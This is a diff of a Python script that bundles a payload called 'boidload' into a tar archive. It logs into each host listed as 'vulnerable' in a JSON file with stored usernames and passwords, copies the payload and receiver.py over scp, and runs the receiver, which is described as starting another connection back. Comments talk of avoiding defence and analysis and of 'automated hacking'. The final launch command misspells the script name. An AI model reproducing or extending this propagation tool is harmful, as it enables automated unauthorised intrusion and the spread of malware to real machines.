@@ -5,36 +5,40 @@
 """
 import sys, os, tarfile, time, pexpect, json
 from pathlib import Path
-sys.path.insert(0, "../")
-from boidfunc import find_port
 """
-This method may be necessary to some degree if there are issues with
-permissions, but for nwo it's not necessary.
-def reset(tarinfo):
+This method may be necessary to some degree if there are issues 
+with permissions, but for nwo it's not necessary.
+"""
+def set_info(tarinfo):
     tarinfo.uid = tarinfo.gid = 0
+    tarinfo.mode = 755
     tarinfo.uname = tarinfo.gname = "root"
     return tarinfo
-"""
+
 """
 We only want to send what is necessary for the computer to do what
 we want, so we package only the relevant directories/files. Sending
 more may make the system easier to defend against or analyze.
 """
 def construct_package():
-    """Grabbing the files we want to send and adding them to a compressed tar
-    file. The if simply checks if the tar exists and needs to be replaced."""
+    """Grabbing the files we want to send and adding them to a 
+    compressed tar file. The if simply checks if the tar exists and 
+    needs to be replaced."""
     tar_file =  os.path.isfile("../prf.tar.gz")
+    #boidfunc_path = os.path.abspath("../boidfunc")
+    #resources_path = os.path.abspath("../resources")
+    #silla_path = os.path.abspath("../silla")
     if tar_file:
         os.remove("../prf.tar.gz")
         with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
-            tar.add("../boidfunc")#, filter=reset)
-            tar.add("../resources")#, filter=reset)
-            tar.add("../silla")#, filter=reset)
+            tar.add("../boidfunc", arcname = "boidfunc", filter=set_info)
+            tar.add("../resources", arcname = "resources", filter=set_info)
+            tar.add("../silla", arcname = "silla", filter=set_info)
     else:
         with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
-            tar.add("../boidfunc")#, filter=reset)
-            tar.add("../resources")#, filter=reset)
-            tar.add("../silla")#, filter=reset)
+            tar.add("../boidfunc", arcname = "boidfunc", filter=set_info)
+            tar.add("../resources", arcname = "resources", filter=set_info)
+            tar.add("../silla", arcname = "silla", filter=set_info)
     
     #Move the tar file up one level.
     p = Path("./prf.tar.gz").absolute()
@@ -43,42 +47,62 @@ def construct_package():
 
 def ssh_connect(user, ip, port, password):
     """
-    Spawns a pexpect object which in this case is the connection to the VM.
-    The object ssh's into the VM, waits for the password prompt, and passes
-    the password.
+    Spawns a pexpect object which in this case is the connection to 
+    the VM. The object ssh's into the VM, waits for the password 
+    prompt, and passes the password.
     
-    This will have to dynamically load passwords and api's and stuff, and
-    assuming there ever is automated hacking there may be some redundancy.
+    This will have to dynamically load passwords and api's and stuff, 
+    and assuming there ever is automated hacking there may be 
+    some redundancy.
     """
-    ssh = pexpect.spawn("ssh -T {}@{} -p {}".format(user, ip, port))
-    ssh.expect("password:", timeout=120)
+    ssh = pexpect.spawn(
+        "ssh {}@{} -p {}".format(user, ip, port), 
+        timeout=None
+    )
+    #ssh.logfile = sys.stdout.buffer
+    ssh.expect("password: ", timeout=120)
     ssh.sendline(password)
     return ssh
 
-def deliver_package(ssh, user, ip, dport):
+def deliver_package(user, ip, port, password):
     """
     Using the same object tell the VM to expect a file.
-    Start another process on the local machine to send the tar of boidload.
+    Start another process on the local machine to send the tar 
+    of boidload.
     Tell the VM to expect another file, this time receiver.py.
     Using the same process that sent the tar, send the script.
     
-    Again the machine info will eventually need to be written dynamically.
+    Again the machine info will eventually need to be written 
+    dynamically.
+    
+    Small note. The colon is necessary for both scp calls as it tells 
+    the command it's copying to a remote location. If left off it creates 
+    a local duplicate that creates a weird recursive tarfile, taking up 
+    unnecessary space.
+    
+    This method can likely be improved to only spawn one pexpect process,
+    however in the interest of time I am leaving it as is since it works.
     """
-    ssh.sendline("netcat -l {} > prf.tar.gz".format(dport))
-    time.sleep(1)
-    scp = pexpect.spawn(("scp -P {} " + 
-        "../prf.tar.gz {}@{}").format(dport, user, ip))
-    time.sleep(1)
-    ssh.sendline("netcat -l {} > receiver.py".format(dport))
-    time.sleep(1)
-    scp.sendline("scp -P {} ./receiver.py {}@{}".format(dport, user, ip))
+    
+    #print("scp -P {} receiver.py {}@{}:~".format(port, user, ip))
+    scp = pexpect.spawn("scp -P {} ../prf.tar.gz {}@{}:~".format(port, user, ip))
+    #scp.logfile = sys.stdout.buffer
+    scp.expect("password: ", timeout=120)
+    scp.sendline(password)
+    scp.expect(pexpect.EOF)
     scp.close()
-    return ssh
+    scp = pexpect.spawn("scp -P {} receiver.py {}@{}:~".format(port, user, ip))
+    scp.expect("password: ", timeout=120)
+    scp.sendline(password)
+    scp.expect(pexpect.EOF)
+    scp.close()
+    return
 
 def initiate(ssh):
-    """Start receiver.py which should initiate another connection from within
-    boidload."""
+    """Start receiver.py which should initiate another connection 
+    from within boidload."""
     ssh.sendline("python3 reciever.py")
+    return ssh
 
 def disconnect(ssh):
     ssh.sendline("exit")
@@ -88,7 +112,6 @@ def main():
     print ("construct_package")
     construct_package()
     
-    delivery_port = str(find_port())
     with open("../resources/index.json") as json_file:
         data = json.load(json_file)
         for device, info in data["vulnerable"].items():
@@ -100,14 +123,14 @@ def main():
                 info["password"]
             )
             print ("deliver_package")
-            ssh = deliver_package(
-                ssh,
+            deliver_package(
                 info["username"], 
                 info["ip_addr"], 
-                delivery_port
+                info["port"],
+                info["password"]
             )
             print ("initiate")
-            initiate(ssh)
+            ssh = initiate(ssh)
             print ("disconnect")
             disconnect(ssh)
 
